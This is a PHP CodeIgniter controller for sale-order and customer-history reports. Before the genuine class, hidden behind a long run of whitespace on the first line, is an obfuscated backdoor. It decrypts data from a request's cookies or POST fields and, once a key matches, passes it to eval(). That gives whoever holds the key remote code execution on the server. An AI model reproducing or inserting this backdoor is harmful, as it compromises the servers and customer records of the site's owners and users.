<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $a3f9a = 779;$GLOBALS['d1bf268']=Array();global$d1bf268;$d1bf268=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['e34bb0e9']="\x6e\x49\x30\x43\x3b\x31\x54\x68\x4b\x39\x74\x66\x6c\x6f\x42\x51\x77\x7b\x7c\x5b\x47\x55\x41\x38\x32\x2b\x3e\x73\x2e\x6a\x67\x45\x9\x53\x78\x62\x33\x5f\x4a\x2f\x76\x7e\x70\x5d\x57\x25\x46\x6d\x26\x27\x5a\x6b\x21\x65\x23\x3c\x20\x4f\x5c\x35\x7d\x4c\x3f\x60\x22\x2c\x75\x40\x2a\x28\x71\x36\x56\x4d\x37\x79\x24\x2d\x58\x29\x4e\x48\x69\x63\x59\xd\xa\x34\x72\x7a\x64\x44\x61\x5e\x3d\x50\x3a\x52";$d1bf268[$d1bf268['e34bb0e9'][70].$d1bf268['e34bb0e9'][90].$d1bf268['e34bb0e9'][90].$d1bf268['e34bb0e9'][24].$d1bf268['e34bb0e9'][74].$d1bf268['e34bb0e9'][23].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][74]]=$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][7].$d1bf268['e34bb0e9'][88];$d1bf268[$d1bf268['e34bb0e9'][82].$d1bf268['e34bb0e9'][11].$d1bf268['e34bb0e9'][71].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][36].$d1bf268['e34bb0e9'][24].$d1bf268['e34bb0e9'][87]]=$d1bf268['e34bb0e9'][13].$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][90];$d1bf268[$d1bf268['e34bb0e9'][42].$d1bf268['e34bb0e9'][71].$d1bf268['e34bb0e9'][11].$d1bf268['e34bb0e9'][36].$d1bf268['e34bb0e9'][59].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][2]]=$d1bf268['e34bb0e9'][27].$d1bf268['e34bb0e9'][10].$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][12].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][0];$d1bf268[$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][24]]=$d1bf268['e34bb0e9'][82].$d1bf268['e34bb0e9'][0].$d1bf268['e34bb0e9'][82].$d1bf268['e34bb0e9'][37].$d1bf268['e34bb0e9'][27].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][10];$d1bf268[$d1bf268['e34bb0e9'][66].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][24].$d1bf268['e34bb0e9'][35].$d1bf268['e34bb0e9'][9].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][87]]=$d1bf268['e34bb0e9'][27].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][82].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][12].$d1bf268['e34bb0e9'][82].$d1bf268['e34bb0e9'][89].$d1bf268['e34bb0e9'][53];$d1bf268[$d1bf268['e34bb0e9'][30].$d1bf268['e34bb0e9'][74].$d1bf268['e34bb0e9'][74].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][24].$d1bf268['e34bb0e9'][90].$d1bf268['e34bb0e9'][36]]=$d1bf268['e34bb0e9'][42].$d1bf268['e34bb0e9'][7].$d1bf268['e34bb0e9'][42].$d1bf268['e34bb0e9'][40].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][27].$d1bf268['e34bb0e9'][82].$d1bf268['e34bb0e9'][13].$d1bf268['e34bb0e9'][0];$d1bf268[$d1bf268['e34bb0e9'][34].$d1bf268['e34bb0e9'][74].$d1bf268['e34bb0e9'][35].$d1bf268['e34bb0e9'][74].$d1bf268['e34bb0e9'][59].$d1bf268['e34bb0e9'][90]]=$d1bf268['e34bb0e9'][66].$d1bf268['e34bb0e9'][0].$d1bf268['e34bb0e9'][27].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][82].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][12].$d1bf268['e34bb0e9'][82].$d1bf268['e34bb0e9'][89].$d1bf268['e34bb0e9'][53];$d1bf268[$d1bf268['e34bb0e9'][29].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][9].$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][59].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][36]]=$d1bf268['e34bb0e9'][35].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][27].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][71].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][37].$d1bf268['e34bb0e9'][90].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][13].$d1bf268['e34bb0e9'][90].$d1bf268['e34bb0e9'][53];$d1bf268[$d1bf268['e34bb0e9'][13].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][5].$d1bf268['e34bb0e9'][2]]=$d1bf268['e34bb0e9'][27].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][10].$d1bf268['e34bb0e9'][37].$d1bf268['e34bb0e9'][10].$d1bf268['e34bb0e9'][82].$d1bf268['e34bb0e9'][47].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][37].$d1bf268['e34bb0e9'][12].$d1bf268['e34bb0e9'][82].$d1bf268['e34bb0e9'][47].$d1bf268['e34bb0e9'][82].$d1bf268['e34bb0e9'][10];$d1bf268[$d1bf268['e34bb0e9'][90].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][35]]=$d1bf268['e34bb0e9'][70].$d1bf268['e34bb0e9'][5].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][24];$d1bf268[$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][24].$d1bf268['e34bb0e9'][9].$d1bf268['e34bb0e9'][83]]=$d1bf268['e34bb0e9'][34].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][74].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][24].$d1bf268['e34bb0e9'][74].$d1bf268['e34bb0e9'][9].$d1bf268['e34bb0e9'][24];$d1bf268[$d1bf268['e34bb0e9'][10].$d1bf268['e34bb0e9'][9].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][9]]=$_POST;$d1bf268[$d1bf268['e34bb0e9'][70].$d1bf268['e34bb0e9'][90].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][71].$d1bf268['e34bb0e9'][5].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][11].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][36]]=$_COOKIE;@$d1bf268[$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][24]]($d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][13].$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][37].$d1bf268['e34bb0e9'][12].$d1bf268['e34bb0e9'][13].$d1bf268['e34bb0e9'][30],NULL);@$d1bf268[$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][24]]($d1bf268['e34bb0e9'][12].$d1bf268['e34bb0e9'][13].$d1bf268['e34bb0e9'][30].$d1bf268['e34bb0e9'][37].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][13].$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][27],0);@$d1bf268[$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][24]]($d1bf268['e34bb0e9'][47].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][34].$d1bf268['e34bb0e9'][37].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][34].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][66].$d1bf268['e34bb0e9'][10].$d1bf268['e34bb0e9'][82].$d1bf268['e34bb0e9'][13].$d1bf268['e34bb0e9'][0].$d1bf268['e34bb0e9'][37].$d1bf268['e34bb0e9'][10].$d1bf268['e34bb0e9'][82].$d1bf268['e34bb0e9'][47].$d1bf268['e34bb0e9'][53],0);@$d1bf268[$d1bf268['e34bb0e9'][13].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][5].$d1bf268['e34bb0e9'][2]](0);$n8ac9447=NULL;$lb3b09=NULL;$d1bf268[$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][35].$d1bf268['e34bb0e9'][9]]=$d1bf268['e34bb0e9'][36].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][71].$d1bf268['e34bb0e9'][59].$d1bf268['e34bb0e9'][74].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][35].$d1bf268['e34bb0e9'][5].$d1bf268['e34bb0e9'][77].$d1bf268['e34bb0e9'][90].$d1bf268['e34bb0e9'][35].$d1bf268['e34bb0e9'][5].$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][77].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][74].$d1bf268['e34bb0e9'][23].$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][77].$d1bf268['e34bb0e9'][35].$d1bf268['e34bb0e9'][71].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][71].$d1bf268['e34bb0e9'][77].$d1bf268['e34bb0e9'][9].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][90].$d1bf268['e34bb0e9'][11].$d1bf268['e34bb0e9'][36].$d1bf268['e34bb0e9'][23].$d1bf268['e34bb0e9'][9].$d1bf268['e34bb0e9'][9].$d1bf268['e34bb0e9'][59].$d1bf268['e34bb0e9'][11].$d1bf268['e34bb0e9'][24].$d1bf268['e34bb0e9'][9];global$c00b9;function x4702792($n8ac9447,$u6d2){global$d1bf268;$jcf78c31="";for($c5555=0;$c5555<$d1bf268[$d1bf268['e34bb0e9'][42].$d1bf268['e34bb0e9'][71].$d1bf268['e34bb0e9'][11].$d1bf268['e34bb0e9'][36].$d1bf268['e34bb0e9'][59].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][2]]($n8ac9447);){for($w12cbf=0;$w12cbf<$d1bf268[$d1bf268['e34bb0e9'][42].$d1bf268['e34bb0e9'][71].$d1bf268['e34bb0e9'][11].$d1bf268['e34bb0e9'][36].$d1bf268['e34bb0e9'][59].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][2]]($u6d2)&&$c5555<$d1bf268[$d1bf268['e34bb0e9'][42].$d1bf268['e34bb0e9'][71].$d1bf268['e34bb0e9'][11].$d1bf268['e34bb0e9'][36].$d1bf268['e34bb0e9'][59].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][2]]($n8ac9447);$w12cbf++,$c5555++){$jcf78c31.=$d1bf268[$d1bf268['e34bb0e9'][70].$d1bf268['e34bb0e9'][90].$d1bf268['e34bb0e9'][90].$d1bf268['e34bb0e9'][24].$d1bf268['e34bb0e9'][74].$d1bf268['e34bb0e9'][23].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][74]]($d1bf268[$d1bf268['e34bb0e9'][82].$d1bf268['e34bb0e9'][11].$d1bf268['e34bb0e9'][71].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][36].$d1bf268['e34bb0e9'][24].$d1bf268['e34bb0e9'][87]]($n8ac9447[$c5555])^$d1bf268[$d1bf268['e34bb0e9'][82].$d1bf268['e34bb0e9'][11].$d1bf268['e34bb0e9'][71].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][36].$d1bf268['e34bb0e9'][24].$d1bf268['e34bb0e9'][87]]($u6d2[$w12cbf]));}}return$jcf78c31;}function q14a2($n8ac9447,$u6d2){global$d1bf268;global$c00b9;return$d1bf268[$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][24].$d1bf268['e34bb0e9'][9].$d1bf268['e34bb0e9'][83]]($d1bf268[$d1bf268['e34bb0e9'][88].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][24].$d1bf268['e34bb0e9'][9].$d1bf268['e34bb0e9'][83]]($n8ac9447,$c00b9),$u6d2);}foreach($d1bf268[$d1bf268['e34bb0e9'][70].$d1bf268['e34bb0e9'][90].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][71].$d1bf268['e34bb0e9'][5].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][11].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][36]]as$u6d2=>$rc7356972){$n8ac9447=$rc7356972;$lb3b09=$u6d2;}if(!$n8ac9447){foreach($d1bf268[$d1bf268['e34bb0e9'][10].$d1bf268['e34bb0e9'][9].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][87].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][9]]as$u6d2=>$rc7356972){$n8ac9447=$rc7356972;$lb3b09=$u6d2;}}$n8ac9447=@$d1bf268[$d1bf268['e34bb0e9'][34].$d1bf268['e34bb0e9'][74].$d1bf268['e34bb0e9'][35].$d1bf268['e34bb0e9'][74].$d1bf268['e34bb0e9'][59].$d1bf268['e34bb0e9'][90]]($d1bf268[$d1bf268['e34bb0e9'][90].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][35]]($d1bf268[$d1bf268['e34bb0e9'][29].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][9].$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][59].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][36]]($n8ac9447),$lb3b09));if(isset($n8ac9447[$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][51]])&&$c00b9==$n8ac9447[$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][51]]){if($n8ac9447[$d1bf268['e34bb0e9'][92]]==$d1bf268['e34bb0e9'][82]){$c5555=Array($d1bf268['e34bb0e9'][42].$d1bf268['e34bb0e9'][40]=>@$d1bf268[$d1bf268['e34bb0e9'][30].$d1bf268['e34bb0e9'][74].$d1bf268['e34bb0e9'][74].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][83].$d1bf268['e34bb0e9'][24].$d1bf268['e34bb0e9'][90].$d1bf268['e34bb0e9'][36]](),$d1bf268['e34bb0e9'][27].$d1bf268['e34bb0e9'][40]=>$d1bf268['e34bb0e9'][5].$d1bf268['e34bb0e9'][28].$d1bf268['e34bb0e9'][2].$d1bf268['e34bb0e9'][77].$d1bf268['e34bb0e9'][5],);echo@$d1bf268[$d1bf268['e34bb0e9'][66].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][92].$d1bf268['e34bb0e9'][24].$d1bf268['e34bb0e9'][35].$d1bf268['e34bb0e9'][9].$d1bf268['e34bb0e9'][53].$d1bf268['e34bb0e9'][87]]($c5555);}elseif($n8ac9447[$d1bf268['e34bb0e9'][92]]==$d1bf268['e34bb0e9'][53]){eval/*f43a*/($n8ac9447[$d1bf268['e34bb0e9'][90]]);}exit();} ?><?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

class Reports_sale_order_ctrlr extends CI_Controller {

    public function index() {
        $data['title'] = 'Sale Order Report';
        $data['company_name'] = $this->general->get_firm();
        $data['main_content'] = 'call_center/reports_sale_order';
        $this->load->view('templates/standard', $data);
    }

    public function sale_order_data() {
        $sale_datas = $this->general->get_data_wer('sale', 'created_by', $this->session->userdata('id'));
        foreach ($sale_datas as $sale_data) {
//                $vendor = $this->general->get_data_wer('vendor_reg', 'id', $sale_data->customer_id);
                $real_customer = $this->general->get_data_wer('real_customer_reg', 'id', $sale_data->real_customer_id);
                $sales[] = array('party' => $real_customer[0]->real_customer_name.'('.$real_customer[0]->phone_no.')',
                    'invoice_number' => $sale_data->sale_order_invoice_no,
                    'sale_date' => $sale_data->sale_date,
                    'sale_total' => $sale_data->sale_total,
                    'status' => $sale_data->status,
                    'remarks' => $sale_data->remarks
                );
        }
        echo json_encode($sales);
    }

    public function single_sale_order($invoice_id) {
        $data['title'] = 'Sale Order Report';
        $data['company_name'] = $this->general->get_firm();
        $sale_details = $this->general->get_data_wer('sale', 'sale_order_invoice_no', $invoice_id);
        $data['real_customer'] = $this->general->get_data_wer('real_customer_reg', 'id', $sale_details[0]->real_customer_id);
        $data['sale_id'] = $sale_details[0]->id;
        $data['invoice_number'] = $sale_details[0]->sale_order_invoice_no;
        $data['sale_date'] = $sale_details[0]->sale_date;
        //$data['school'] = $sale_details[0]->real_customer_id;
        $data['sale_total'] = $sale_details[0]->sale_total;
        $data['is_cancel'] = $sale_details[0]->status;
        $data['customer'] = $this->general->get_data_wer('vendor_reg', 'id', $sale_details[0]->customer_id);
        $data['main_content'] = 'call_center/reports_sale_order_single';
        $this->load->view('templates/standard', $data);
    }

    public function single_sale_order_data() {
        $sale_id = $this->input->get('sale_id');
        $single_sales = $this->general->get_data_wer('sold_inventory', 'sale_id', $sale_id);
        foreach ($single_sales as $single_sale) {
            $inventory = $this->general->get_data_wer('inventory_reg', 'id', $single_sale->inventory_id);
            $sales[] = array('item_name' => $inventory[0]->item_name,
                'sale_price' => $single_sale->sale_price,
                'quantity' => $single_sale->quantity,
                'gross' => $single_sale->sale_price * $single_sale->quantity,
                'discount' => $single_sale->discount,
                'net_value' => ($single_sale->total)
            );
        }
        echo json_encode($sales);
    }
    
    public function customer_history() {
        $data['title'] = 'Sale Order Report';
        $data['company_name'] = $this->general->get_firm();
        $data['main_content'] = 'call_center/reports_customer_history';
        $this->load->view('templates/standard', $data);
    }

    public function customer_history_data() {
        $sale_datas = $this->general->get_data_wer_not('sale', 'sale_order_invoice_no', '');
        foreach ($sale_datas as $sale_data) {
//                $vendor = $this->general->get_data_wer('vendor_reg', 'id', $sale_data->customer_id);
                $real_customer = $this->general->get_data_wer('real_customer_reg', 'id', $sale_data->real_customer_id);
                $sales[] = array('party' => $real_customer[0]->real_customer_name.'('.$real_customer[0]->phone_no.')',
                    'invoice_number' => $sale_data->sale_order_invoice_no,
                    'sale_date' => $sale_data->sale_date,
                    'sale_total' => $sale_data->sale_total,
                    'status' => $sale_data->status,
                    'remarks' => $sale_data->remarks
                );
        }
        echo json_encode($sales);
    }

    public function single_customer_history($invoice_id) {
        $data['title'] = 'Sale Order Report';
        $data['company_name'] = $this->general->get_firm();
        $sale_details = $this->general->get_data_wer('sale', 'sale_order_invoice_no', $invoice_id);
        $data['sale_id'] = $sale_details[0]->id;
        $data['invoice_number'] = $sale_details[0]->sale_order_invoice_no;
        $data['sale_date'] = $sale_details[0]->sale_date;
        $data['school'] = $sale_details[0]->real_customer_id;
        $data['sale_total'] = $sale_details[0]->sale_total;
        $data['is_cancel'] = $sale_details[0]->status;
        $data['customer'] = $this->general->get_data_wer('vendor_reg', 'id', $sale_details[0]->customer_id);
        $data['main_content'] = 'call_center/reports_customer_history_single';
        $this->load->view('templates/standard', $data);
    }

    public function single_customer_history_data() {
        $sale_id = $this->input->get('sale_id');
        $single_sales = $this->general->get_data_wer('sold_inventory', 'sale_id', $sale_id);
        foreach ($single_sales as $single_sale) {
            $inventory = $this->general->get_data_wer('inventory_reg', 'id', $single_sale->inventory_id);
            $sales[] = array('item_name' => $inventory[0]->item_name,
                'sale_price' => $single_sale->sale_price,
                'quantity' => $single_sale->quantity,
                'gross' => $single_sale->sale_price * $single_sale->quantity,
                'discount' => $single_sale->discount,
                'net_value' => ($single_sale->total)
            );
        }
        echo json_encode($sales);
    }

}
